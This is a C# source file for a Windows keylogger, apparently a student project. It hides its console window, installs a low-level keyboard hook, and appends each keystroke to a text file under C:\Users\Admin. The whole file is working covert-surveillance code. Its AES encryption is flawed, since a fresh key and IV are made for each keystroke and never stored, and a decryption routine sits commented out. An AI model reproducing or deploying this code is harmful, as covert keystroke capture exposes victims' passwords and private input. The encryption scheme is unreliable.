using System;
using System.Data;
using System.Configuration;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;


namespace Projekti1
{
    class Program
    {
        static int SW_HIDE = 0;
        static int SW_SHOW = 5;


        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {

            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);

            

            string filePath = @"C:\Users\Admin\KeyLogger.txt";
            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                hookID = SetHook(llkProcedure);
            }

            /*
            using (RijndaelManaged myRijndael = new RijndaelManaged())
            {

                myRijndael.GenerateKey();
                myRijndael.GenerateIV();


                string path = @"C:\Users\Admin\KLDecrypt.txt";
                byte[] pathbyte = Encoding.ASCII.GetBytes(path);
                StreamWriter swd = new StreamWriter(path, true);
                swd.Write(DecryptedString(pathbyte, myRijndael.Key, myRijndael.IV));
            }

             */

            Application.Run();
            UnhookWindowsHookEx(hookID);

        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static String EncryptString(string plainText, byte[] Key, byte[] IV)
        {
            
            byte[] encrypted;
             using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                 using (MemoryStream msEncrypt = new MemoryStream())
                {
                     using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                         using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {

                             swEncrypt.Write(plainText);
                        }
                         encrypted = msEncrypt.ToArray();
                    }
                    
                }
                
            }
            return Convert.ToBase64String(encrypted);

        }


       /*

        static String DecryptedString(byte[] cipherText, byte[] Key, byte[] IV)
        {


            String plainText = null;
            //byte[] plaintextbytes = Encoding.ASCII.GetBytes(plainText);
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Padding = PaddingMode.None;

                rijAlg.Key = Key;
                rijAlg.IV = IV;
                
                // Create a decrytor to perform the stream transform.
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                // Create the streams used for decryption.
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plainText = srDecrypt.ReadToEnd();
                        }
                    }
                }
                return plainText;
            }

        }


 */


private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
                            {
                                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                                {
                                    int vkCode = Marshal.ReadInt32(lParam);
                                    var keyName = Enum.GetName(typeof(Keys), vkCode);
                                    var path = @"C:\Users\Admin\KeyLogger.txt";

                                    Aes objAes = Aes.Create();
                                    byte[] key = objAes.Key;
                                    byte[] IV = objAes.IV;

                                    var text = ((Keys)vkCode).ToString();
                                    text = EncryptString(text, key, IV);
                                    File.AppendAllText(path, text);
                                }
                                return CallNextHookEx(hookID, nCode, wParam, lParam);
                             }


        


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

    }
}
